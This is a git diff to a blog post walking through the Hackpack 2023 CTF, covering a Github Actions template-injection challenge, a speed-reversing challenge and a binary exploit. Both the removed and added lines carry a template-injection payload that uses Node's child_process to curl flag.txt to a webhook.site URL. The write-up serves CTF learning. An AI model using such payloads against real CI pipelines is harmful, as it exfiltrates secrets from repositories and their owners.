@@ -1,6 +1,6 @@
 ---
 layout: post
-title:  "Hackpack 2022 - Jeopardy CTF Walkthrough"
+title:  "Hackpack 2023 - Jeopardy CTF Walkthrough"
 date:   2023-04-16 12:28:05 +0100
 categories: writeups
 ---
@@ -49,7 +49,7 @@ wolfhowl.cha.hackpack.club
 
 ```
 Author: LL3006
-Description: Code injection with Github Actions
+Description: Template injection in Github Actions
 Category: Web
 Points: 100
 Solves: 94
@@ -63,15 +63,19 @@ By looking at the implemented Github Action, it's possible to note that it's pos
 
 The payload is injected in the issue body, like this:
 
+{% raw %}
 ```
-[test]( {{ code here }} )
+{{ code here }}
 ```
+{% endraw %}
 
 The injected code is NodeJS, and the flag is in `flag.txt`, so it's possible to craft a payload like this:
 
+{% raw %}
 ```
-[test]( {{ process.mainModule.require('child_process').exec('curl https://webhook.site/<webhook_uuid>?flag=$(cat flag.txt | xxd -p)') }} )
+{{ process.mainModule.require("child_process").exec("curl --data-binary '@./flag.txt' https://webhook.site/<webhook_url>") }}
 ```
+{% endraw %}
 
 # Speed-Rev: Humans
 
@@ -121,15 +125,15 @@ $ echo $?
 So it's possible to solve this challenge without automating the interaction.
 
 That was the hypothesis, but after submitting the string, we were given a different kind of binary.
-Two in a row with array of characters to just combine:
+Two in a row with array of characters to just combine (example):
 - HXUH2ipzsitnRm63
 - DWHhEntwRuq57aYp
 
 The fourth was a linear system of equations of the form:
-1 1 0 ..   0 = b0
-0 1 1 0 .. 0 = b1
-..
-0 ..   0 1 1 = bN
+- 1 1 0 ..   0 = b0
+- 0 1 1 0 .. 0 = b1
+- ..
+- 0 ..   0 1 1 = bN
 
 So there is one missing equation, i.e., it is possible to arbitrarily set the first character.
 
@@ -246,7 +250,7 @@ The random number generation has a particular handling:
 Let's compare the structure of the `rand_handler` object with the structure of the `static_number` object:
 ```
 | Random number (init to 0) | Previous random number (init to 0) | Pointer to `generateRandNum` function |
-|						Name									 | 				Number					 |
+|                         Name                                   |              Number                   |
 ```
 
 ## Exploitation
